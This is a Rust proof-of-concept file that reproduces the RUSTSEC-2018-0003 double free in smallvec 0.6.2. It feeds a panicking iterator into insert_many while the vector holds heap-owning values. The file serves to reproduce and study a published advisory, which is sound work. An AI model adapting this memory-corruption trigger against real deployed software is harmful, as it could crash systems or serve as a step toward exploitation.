//! RUSTSEC-2018-0003 / smallvec 0.6.2.
//!
//! Mechanical payload-strengthening adapter for Vurich's upstream issue-96
//! gist. The published witness explicitly says replacing its logging-only
//! `Printer` payload with an owning value exposes the double free. `HeapOwner`
//! makes that substitution and fixes the gist's missing `mut` binding.

use smallvec::SmallVec;

struct HeapOwner(usize, #[allow(dead_code)] Box<usize>);

impl Drop for HeapOwner {
    fn drop(&mut self) {
        eprintln!("Dropping {}", self.0);
    }
}

struct Bad;

impl Iterator for Bad {
    type Item = HeapOwner;

    fn size_hint(&self) -> (usize, Option<usize>) {
        (1, None)
    }

    fn next(&mut self) -> Option<Self::Item> {
        panic!("published iterator panic")
    }
}

fn main() {
    let mut vec: SmallVec<[HeapOwner; 0]> = vec![
        HeapOwner(0, Box::new(0)),
        HeapOwner(1, Box::new(1)),
        HeapOwner(2, Box::new(2)),
    ]
    .into();

    vec.insert_many(0, Bad);
}
